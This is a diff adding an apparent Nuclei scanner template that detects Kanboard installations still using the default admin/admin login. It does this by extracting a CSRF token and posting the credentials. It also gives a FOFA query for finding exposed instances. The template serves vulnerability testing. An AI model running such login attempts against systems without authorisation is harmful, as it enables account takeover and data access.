@@ -1,0 +1,58 @@
+id: kanboard-default-login
+
+info:
+  name: Kanboard - Default Login
+  author: shelled
+  severity: high
+  description: Kanboard contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://twitter.com/0x_rood/status/1607068644634157059
+    - https://github.com/kanboard/kanboard
+    - https://docs.kanboard.org/v1/admin/installation/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:kanboard:kanboard:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="Kanboard"
+    product: kanboard
+    vendor: kanboard
+  tags: default-login,kanboard
+
+http:
+  - raw:
+      - |
+        GET /?controller=AuthController&action=login HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /?controller=AuthController&action=check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{user}}&password={{pass}}&csrf_token={{csrf_token}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+      pass:
+        - admin
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        part: body
+        group: 1
+        regex:
+          - "hidden\" name=\"csrf_token\" value=\"([0-9a-z]+)\""
+        internal: true
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(location, 'controller=DashboardController&action=show')
+          - status_code == 302
+        condition: and
+# digest: 4a0a00473045022100e9784cac54727d0ed2923931e4a891fcf34d566cf0e4b87bdb3979f1e4257b6502206dc84115adb7ad23c472e8d9dc3100a44cbf16c0e35bab106f028ed0b3049cde:922c64590222798bb761d5b6d8e72950
